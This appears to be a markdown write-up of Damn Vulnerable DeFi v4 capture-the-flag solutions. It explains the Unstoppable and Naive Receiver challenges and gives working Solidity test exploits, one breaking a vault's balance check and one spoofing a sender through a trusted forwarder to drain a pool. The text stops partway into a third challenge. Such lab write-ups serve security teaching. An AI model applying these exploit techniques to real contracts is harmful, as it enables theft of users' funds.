# damn vulnerable defi solutuions

Here I solve Damn Vulnerable DeFi v4 challenges: https://www.damnvulnerabledefi.xyz/

In the explanations below, I assume that you are familiar with contracts.

[1. Unstoppable](#1-unstoppable)      
[2. Naive Receiver](#2-naive-receiver)

## 1. Unstoppable

### Challenge Overview

There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There's a monitoring contract to check liveness of the flashloan feature.
Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.

### Contracts

UnstoppableVault.sol - main logic      
UnstoppableMonitor.sol - monitoring if vault is functional      
      
### Vulnerability Analysis

In the UnstoppableVault.sol contract, we have a flashLoan function, where the core functionality is implemented. If we break this function, the vault will stop giving loans.

There are 3 checkings before the function starts executing the loan

      if (amount == 0) revert InvalidAmount(0); // fail early
      if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
      uint256 balanceBefore = totalAssets();
      if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

This is the critical part. If we succeed in making the function always fail one of those checks, the vault will stop giving loans.
The only checking that is not dependent on function parameters is the third one. 

      if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

This check creates a strict requirement that the vault's accounting system always match the actual token balance. 

### Solution

By simply sending DVT tokens to the contract balance, we will successfully break the vault!

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }


## 2. Naive receiver

### Challenge Overview

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 
A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.
All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

### Contracts:

NaiveRecevierPool.sol - The main pool that enables flash loans  
FlashLoanReceiver.sol - The victim borrower contract that will be drained      
BasicForwarder.sol - Enables meta-transactions through an EIP-712 system      
Multicall.sol - Allows batching multiple function calls into one transaction

### Vulnerability Analysis

So, we need to drain 1010 WETH from the pool and borrower contract. In NaiveReceiver.sol, we have the flashLoan function, which implements the core loan functionality. It calls the borrower's onFlashLoan() function, and here, we have our first critical security problem.

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        WETH(payable(token)).approve(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

The onFlashLoan() function only checks if the caller is the pool, but it doesn't check if the transaction initiator is the actual owner of the contract. This means that anyone can call the transaction on the owner's behalf, and here is the solution to the first part of our challenge. As the fee of the loan is 1 ETH, we can drain the borrower's balance by simply calling the loan function 10 times on the owner's behalf. Now, all 1010 ETH are on the contract's balance and belong to the pool deployer.
We also need to drain the pool's balance. If we look closer to withdraw function, we'll see that the function does not check if the receiver is the initiator of the withdrawal. 

        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }

So we can put our address as the receiver. But there is a problem here. We, as msg.sender, don't have any balance in the pool's accounting. If we look closer at how _msgSender() function retrieves the initiator's address, we'll find the second security problem!

    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }

Here, if _msgSender() got the request from trustedForwarder and it has msg.data appended to it, it will return the address appended to the request. So here, we can simply initiate a withdrawal request through Forwarder and append the deployer's address to it. The withdraw function will receive the deployer's address and will transfer all the funds to the specified receiver!

### Solution

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        uint8 numberOfCalls = 11;

        // Create an array of encoded flashLoan calls
        bytes[] memory encodedCalls = new bytes[](numberOfCalls);

        for(uint8 i = 0; i < 10; i++) {
            // Encode the call to flashLoan
            encodedCalls[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver),
                address(weth),
                0,
                ""
            );
        }

        // Encode the call to withdraw
        encodedCalls[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))), 
            bytes32(uint256(uint160(deployer)))
        );

        // Encode the multicall data
        bytes memory multicallData = abi.encodeCall(pool.multicall, encodedCalls);

        // Create the request
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: forwarder.nonces(player),
            data: multicallData,
            deadline: 1 days
        });

        // Hash the request
        bytes32 requestHash = keccak256(abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
            )
        );

        // Sign the request
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the transaction
        forwarder.execute(request, signature);
    }

## Truster

### Challenge Overview 

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
The pool holds 1 million DVT tokens. You have nothing.
To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

### Contracts

TrusterLenderPool.sol - 
